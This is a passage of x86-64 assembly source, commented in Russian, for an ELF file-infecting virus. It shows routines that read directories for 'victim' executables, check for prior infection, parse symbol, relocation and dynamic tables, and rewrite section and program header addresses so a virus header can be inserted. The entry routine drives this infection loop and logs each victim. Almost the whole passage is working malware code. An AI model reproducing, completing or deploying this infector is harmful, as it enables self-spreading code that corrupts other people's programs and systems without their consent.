    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx
    pop     %rbx

    ret

/// FIND_SYMTAB_CODE
/// Ищет среди всех заголовков секций заголовк symtab - этот заголовок описывает
/// таблицу символов. Ищем по типу заголовка -
/// у symtab этот тип 2, symtab может быть
/// в файле в единственном числе
/// PARAMS:
/// RDI - указатель нa таблицу заголвоков секций
/// RSI - количество заголовков
_find_symtab:
    push    %rcx
    push    %rdx
    push    %rdi
    push    %rsi

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _find_symtab_fail

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _find_symtab_fail

_find_symtab_cycle:
    mov     %rdi, %rsi
    mov     SHDR_SH_TYPE(%rdi), %rdx

    cmp     $0x2, %rdx   # shdr = symtab?
    je      _find_symtab_success

    add     $0x40, %rsi
    mov     %rsi, %rdi
    loop    _find_symtab_cycle

_find_symtab_success:
    leaq    symtab_shdr_addr(%rip), %rdi
    mov     %rsi,  (%rdi)

    // считаем кол-во записией в symtab
    // symtab size / symtab record size = rec. amount
    mov      SHDR_SH_SIZE(%rsi), %rdx
    mov      $0x18, %ecx
    movl     %edx, %eax
    xor      %rdx, %rdx
    idivl    %ecx

    leaq    symtab_records_amount(%rip), %rdi
    mov     %rax, (%rdi)

    xor     %rax, %rax
    jmp     _find_symtab_exit

_find_symtab_fail:
    mov     $-1, %rax

_find_symtab_exit:
    pop     %rsi
    pop     %rdi
    pop     %rdx
    pop     %rcx

    ret

/// _COUNT_VICTIM_CODE_BEGIN_VADDR
/// считает виртуальный адрес кода жертвы
_count_victim_code_begin_vaddr:
    push    %rdx
    push    %rdi
    push    %rsi

    mov    victim_code_offset(%rip), %rdx
    test    %rdx, %rdx
    je     _count_victim_code_begin_vaddr_fail

    mov    first_seg_vaddr(%rip), %rdi
    test   %rdi, %rdi
    je     _count_victim_code_begin_vaddr_fail

    add    %rdx, %rdi

    leaq   victim_code_frm_begin_vaddr(%rip), %rsi
    mov    %rdi, (%rsi)
    xor    %rax, %rax
    jmp     _count_victim_code_begin_vaddr_exit

_count_victim_code_begin_vaddr_fail:
    mov     $-1, %rax

_count_victim_code_begin_vaddr_exit:
    pop    %rsi
    pop    %rdi
    pop    %rdx

    ret
/// _PARSE_VICTIM
/// Вызывает парсинг жертвы
/// В случае провала возвращ -1
_parse_victim:
    call    _get_victim_addr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _is_it_elf
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_phdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_shdrs_info
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _check_file_infection
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_first_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_last_seg_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

    call     _find_dynamic
    test    %rax, %rax
    je      _check_bind_now

_check_bind_now:
    call   _find_bind_now_record
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _get_victim_whole_code_addr_and_size
    test    %rax, %rax
    je      _find_first_text_section

    call    _get_victim_code_addr_and_size_with_bind_now
    test    %rax, %rax
    jne     _parse_victim_fail

_find_first_text_section:
    call    _find_victim_text_section
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _find_symtab
    test    %rax, %rax
    jne     _parse_victim_fail

    call    _count_victim_code_begin_vaddr
    test    %rax, %rax
    jne     _parse_victim_fail

_parse_victim_success:
    xor     %rax, %rax
    jmp     _parse_victim_exit

_parse_victim_fail:
    mov   $-1, %rax

_parse_victim_exit:
    ret


/// _RECOUNT_SYMBOLS_ADDRS
/// Редактирует vaddr символов
_recount_symbols_addrs:
    push     %rcx
    push     %rbx
    push     %rdx
    push     %r8
    push     %rdi
    push     %rsi

    // проверяем необходимые данные
    mov     symtab_shdr_addr(%rip), %rdi
    test    %rdi, %rdi
    je      _recount_symbols_addrs_fail

    mov     symtab_records_amount(%rip), %rcx
    test    %rcx, %rcx
    je      _recount_symbols_addrs_fail

    mov     dynamic_records_vaddr(%rip), %r8
    test    %r8, %r8
    je      _recount_symbols_addrs_fail

    mov     new_bind_now_flag_record_size(%rip), %rbx
    test    %rbx, %rbx
    je      _recount_symbols_addrs_fail

    mov     victim_elf_addr(%rip), %rsi
    test    %rsi, %rsi
    je      _recount_symbols_addrs_fail

    // указатель на первую запись в symtab
    add     $0x18, %rdi
    add     (%rdi), %rsi
    mov     %rsi, %rdi

    // константа, на которую увеличиваются
    // виртуальные адреса
    mov     $0x38, %rdx

_recount_symbols_addrs_cycle:
    add     $0x8, %rdi   # offset до vaddr символа

    cmp     $0, (%rdi)
    je      _recount_symbols_next_iter

    cmp     %r8, (%rdi)
    jle     _add_const_symtab

    add     %rbx, (%rdi)  # сместили на разм. +1 dyn. record

_add_const_symtab:
    add     %rdx, (%rdi)  # сместили на разм. virus phdr

_recount_symbols_next_iter:
    add     $0x10, %rdi
    loop    _recount_symbols_addrs_cycle

    xor     %rax, %rax
    jmp     _recount_symbols_addrs_exit

_recount_symbols_addrs_fail:
    mov    $-1, %rax

_recount_symbols_addrs_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rdx
    pop     %rbx
    pop     %rcx
    ret



/// _RECOUNT_RELA_CURRENTSECTION
/// увеличивает vaddr релокейта на заданную величину
_recount_rela_current_section:
    push    %rbx
    push    %rcx
    push    %r8
    push    %rdi
    push    %rsi

    // проверяем данные, необходимые
    // для редактирования
    mov     rela_section_offset(%rip), %rdi
    test    %rdi, %rdi
    je     _recount_rela_current_section_fail

    mov     dynamic_records_vaddr(%rip), %r8
    test    %r8, %r8
    je     _recount_rela_current_section_fail

    mov     victim_elf_addr(%rip), %rax
    test    %rax, %rax
    je     _recount_rela_current_section_fail

    mov     rela_section_size(%rip), %rax
    test    %rax, %rax
    je     _recount_rela_current_section_fail

    // посчитали кол-во записей
    // в секции rela
    xor     %rdx, %rdx
    mov     $0x18, %ecx
    idiv    %ecx
    mov     %eax, %ecx

    // кладем константу, на которую
    // увеличиваются адреса и смещения
    mov     $0x38, %rsi

    //  получили адрес кода секции в памяти
    mov     victim_elf_addr(%rip), %rax
    add     %rdi, %rax

    mov     new_bind_now_flag_record_size(%rip), %rbx

_recount_rela_current_section_cycle:
    cmp     $0, (%rax)
    je      _recount_rela_current_next_iter

    cmp     %r8, (%rax)
    jle     _add_const_to_rela

    // vaddr релокейта + размер новой записи
    // dynamic
    add     %rbx, (%rax)

    // vaddr релокейта + константа
_add_const_to_rela:
    add     %rsi, (%rax)

_recount_rela_current_next_iter:
    add     $0x18, %rax   # сдвиг на след. запись
    loop   _recount_rela_current_section_cycle

    xor     %rax, %rax
    jmp     _recount_rela_current_section_exit

_recount_rela_current_section_fail:
    mov     $-1, %rax

_recount_rela_current_section_exit:
    pop     %rsi
    pop     %rdi
    pop     %r8
    pop     %rcx
    pop     %rbx

    ret

/// _RECOUNT_RELA_SECTIONS
/// Находит все секции типа rela
/// и вызывает их пересчитывание
_recount_rela_sections:
    push  %rbx
    push  %rdx
    push  %rcx

    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _recount_rela_sections_fail

    mov     victim_shdr_table_addr(%rip), %rdx
    test    %rdx, %rdx
    je     _recount_rela_sections_fail

_recount_rela_sections_cycle:
    mov     SHDR_SH_TYPE(%rdx), %rbx
    cmp     $0x4, %rbx      # тип rela?

    jne     _recount_rela_sections_next

    mov     SHDR_SH_TYPE(%rdx), %rbx
    mov     %rbx, rela_section_offset(%rip)

    mov     SHDR_SH_SIZE(%rdx), %rbx
    mov     %rbx, rela_section_size(%rip)

    call    _recount_rela_current_section

    test    %rax, %rax
    jne     _recount_rela_sections_fail

_recount_rela_sections_next:
    add     $0x40, %rdx
    loop    _recount_rela_sections_cycle

_recount_rela_sections_success:
    xor     %rax, %rax
    jmp     _recount_rela_sections_exit

_recount_rela_sections_fail:
    mov     $-1, %rax

_recount_rela_sections_exit:
    pop     %rcx
    pop     %rdx
    pop     %rbx

    ret

/// _SHDR_OFFSET_AND_ADDR_RECOUNT
/// Пересчитывает адреса и смещения в заголовках, если они не 0
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
    .globl  _shdr_offset_and_addr_recount
    .type	_shdr_offset_and_addr_recount, @function

_shdr_offset_and_addr_recount:
    push  %rbx
    push  %rdx
    push  %rcx
    push  %r8
    push  %rdi
    push  %rsi

    // проверяем необходимые данные
    mov     victim_shdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _shdr_offset_and_addr_recount_fail

    mov     victim_shdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _shdr_offset_and_addr_recount_fail

    mov     dynamic_records_offset(%rip), %rax
    test    %rax, %rax
    je     _shdr_offset_and_addr_recount_fail

    mov     dynamic_records_vaddr(%rip), %rax
    test    %rax, %rax
    je     _shdr_offset_and_addr_recount_fail

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     $0x38, %rdx

_shdr_offset_and_addr_recount_cycle:

    add     $0xC, %rdi       # смещение до поля sh_addr
    cmp     $0,  (%rdi)      # sh_addr <= 0?

    jle     _recount_shdr_offset

    // секция расположенаа до dynamic?
    mov     dynamic_records_vaddr(%rip), %rax
    cmp   %rax, (%rdi)
    // да
    jle     _add_const_to_addr

    // нет, скорректировать в соответствии
    // с возможным расширением dynamic
    add     %rbx, (%rdi)

_add_const_to_addr:
    add     %rdx, (%rdi)

_recount_shdr_offset:
    add     $0x8, %rdi
    cmp     $0, (%rdi)

    jle     _next_iter_recount

    // секция расположена до dynamic?
    mov     dynamic_records_offset(%rip), %rax
    cmp     %rax, (%rdi)

    jle     _add_const_to_offset

    // нет, скорректировать в соответствии
    // с возможным расширением dynamic
    add     %rbx, (%rdi)

_add_const_to_offset:
    add     %rdx, (%rdi)   # пересчитываем смещение

_next_iter_recount:
    add     $0x28, %rdi    # смещение до след. заголовка
    loop    _shdr_offset_and_addr_recount_cycle

_shdr_offset_and_addr_recount_success:
    xor     %rax, %rax
    jmp     _shdr_offset_and_addr_recount_exit

_shdr_offset_and_addr_recount_fail:
    mov      $-1, %rax

_shdr_offset_and_addr_recount_exit:
    pop      %rsi
    pop      %rdi
    pop      %r8
    pop      %rcx
    pop      %rdx
    pop      %rbx

    ret

/// _PHDR_OFFSET_AND_ADDR_RECOUNT
///    PARAMS
/// RDI -  указатель на заголовки,
/// RSI -  их количество, в
/// RDX -  константа, на которую увеличивается
/// vaddr, paddr и offset всех заголовков, кроме заголовка
/// самой таблицы заголовков сегментов
/// Поскольку секция dynamic может расширяться (в заивимости от того,
/// выставлен в ней флаг BIND_NOW компилером или нет),
/// то код, который находится
/// ниже секции dynamic должен сместиться, учитывая это расширение
_phdr_offset_and_addr_recount:
    push    %rbx
    push    %rdx
    push    %rcx
    push    %r8
    push    %r9
    push    %rdi
    push    %rsi

    // проверяем данные,
    // необходимые для редактирования
    mov     victim_phdr_amount(%rip), %rcx
    test    %rcx, %rcx
    je     _phdr_offset_and_addr_recount_fail

    mov     victim_phdr_table_addr(%rip), %rdi
    test    %rdi, %rdi
    je     _phdr_offset_and_addr_recount_fail

    mov     first_seg_vaddr(%rip), %rsi
    test    %rsi, %rsi
    je     _phdr_offset_and_addr_recount_fail

    mov     dynamic_records_vaddr(%rip), %r8
    test    %r8, %r8
    je     _phdr_offset_and_addr_recount_fail

    mov     dynamic_records_offset(%rip), %r8
    test    %r8, %r8
    je     _phdr_offset_and_addr_recount_fail

    mov     new_bind_now_flag_record_size(%rip), %rbx
    mov     $0x38, %rdx

_phdr_offset_and_addr_recount_cycle:
    mov     dynamic_records_vaddr(%rip), %r8

    movl    (%rdi), %eax

    // это заголовок самой таблицы заголовков?
    cmp     $0x6,  %rax
    je      _edit_phdr_table_header
    // это заголовок сегмента dynamic?
    cmp     $0x2,  %rax
    jne     _phdr_offset_and_addr_check

    // расширяем dynamic на размер
    // вставляемой записи
    add     $0x20, %rdi
    add     %rbx, (%rdi)

    add     $0x8, %rdi
    add     %rbx, (%rdi)

    sub     $0x28,  %rdi
    jmp     _phdr_offset_and_addr_check

_edit_phdr_table_header:
    // редактируем поля p_filesz
    // и p_memsz в заголовке таблицы сегментов
    // заголовков станет на один больше, значит,
    //  размер таблицы надо увеличить на 56 байт
    add     $0x20, %rdi
    add     %rdx, (%rdi)

    add     $0x8, %rdi
    add     %rdx, (%rdi)

    sub     $0x20, %rdi
    jmp     _next_iter_recount_phdr

_phdr_offset_and_addr_check:
    add     $0x10, %rdi    # проверяем адрес

    cmp     %rsi, (%rdi)
    je      _edit_first_segm_header

    cmp     $0,  (%rdi)
    jle     _recount_offset

    jmp     _recount_vaddr_paddr

_edit_first_segm_header:
    // это первый сегмент кода -
    // содерит в себе заголовки
    // увеличить его p_memsz и p_filesz
    // на размер добавляемого заголвока
    // а вот его vaddr,paddr и offset
    // не редактируем - новый заголвок
    // будет вписан В него, а не ДО
    // него
    add     $0x10, %rdi
    add     %rdx, (%rdi)

    add     $0x8, %rdi
    add     %rdx, (%rdi)

    sub     $0x20, %rdi

    jmp     _next_iter_recount_phdr

_recount_vaddr_paddr:
    cmp     %r8, (%rdi)
    jle     _add_const_to_vaddr_paddr

    add     %rdx, (%rdi)    # recount vaddr and paddr
    add     %rbx, (%rdi)

    add     $0x8, %rdi
    add     %rdx, (%rdi)
    add     %rbx, (%rdi)

    sub     $0x8, %rdi

    jmp     _recount_offset
_add_const_to_vaddr_paddr:
    add     %rdx, (%rdi)    # recount vaddr and paddr

    add     $0x8, %rdi
    add     %rdx, (%rdi)

    sub     $0x8, %rdi

_recount_offset:
    mov     dynamic_records_offset(%rip), %r8

    sub     $0x8, %rdi

    cmp     $0, (%rdi)
    jle     _next_iter_recount_phdr

    // сегмент расположен до dynamic?
    cmp     %r8, (%rdi)

    jle     _add_const_to_phdr_offset

    add     %rbx, (%rdi)
    add     %rdx, (%rdi)

    jmp     _next_iter_recount_phdr

_add_const_to_phdr_offset:
    add     %rdx, (%rdi)

    jmp     _next_iter_recount_phdr

_next_iter_recount_phdr:
    add     $0x30, %rdi

    dec     %rcx
    test    %rcx, %rcx
    jne     _phdr_offset_and_addr_recount_cycle

_phdr_offset_and_addr_recount_success:
    xor     %rax, %rax
    jmp     _phdr_offset_and_addr_recount_exit

_phdr_offset_and_addr_recount_fail:
    mov     $-1, %rax

_phdr_offset_and_addr_recount_exit:
    pop     %rsi
    pop     %rdi
    pop     %r9
    pop     %r8
    pop     %rcx
    pop     %rdx
    pop     %rbx

    ret

/// _RECOUNT_VICTIM
/// Пересчитывает данные жертвы
_recount_victim:
    call    _recount_symbols_addrs
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _recount_rela_sections
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _shdr_offset_and_addr_recount
    test    %rax, %rax
    jne     _recount_victim_fail

    call    _phdr_offset_and_addr_recount
    test    %rax, %rax
    jne     _recount_victim_fail

_recount_victim_success:
    xor     %rax, %rax
    jmp     _recount_victim_exit

_recount_victim_fail:
    mov   $-1, %rax

_recount_victim_exit:

    ret

/// _START_INFECTOR
/// старт инфектора
_start_infector:
    call    _allow_write_into_code
    jmp     _save_registers

_clear_old_data:
    call    _clear_dynamic_and_bind_now_data
    call    _my_readdir

_get_victim_name:
    call    _get_file_name
    call    _print_infection_log

    call    _parse_victim
    test    %rax, %rax
    jnz     _get_victim_name

    call    _recount_victim
/// Возвращает регистры в состояние
/// до исполнения вируса
_restore_registers_and_stack:
    mov     old_rsp(%rip), %rsp     # restore old %RSP
    mov     old_rbx(%rip), %rbx
    mov     old_rdx(%rip), %rdx
    mov     old_rcx(%rip), %rcx
    mov     old_rdi(%rip), %rdi
    mov     old_rsi(%rip), %rsi
    mov     old_r8(%rip), %r8
    mov     old_r9(%rip), %r9
    mov     old_r10(%rip), %r10
    mov     old_r11(%rip), %r11
    mov     old_r12(%rip), %r12
    mov     old_r13(%rip), %r13
    mov     old_r14(%rip), %r14
    mov     old_r15(%rip), %r15

/// выход из инфетора
_global_exit:
    mov $0x3c, %rax
    mov $0x0,  %rdi
    syscall

_fin_infector:
    nop
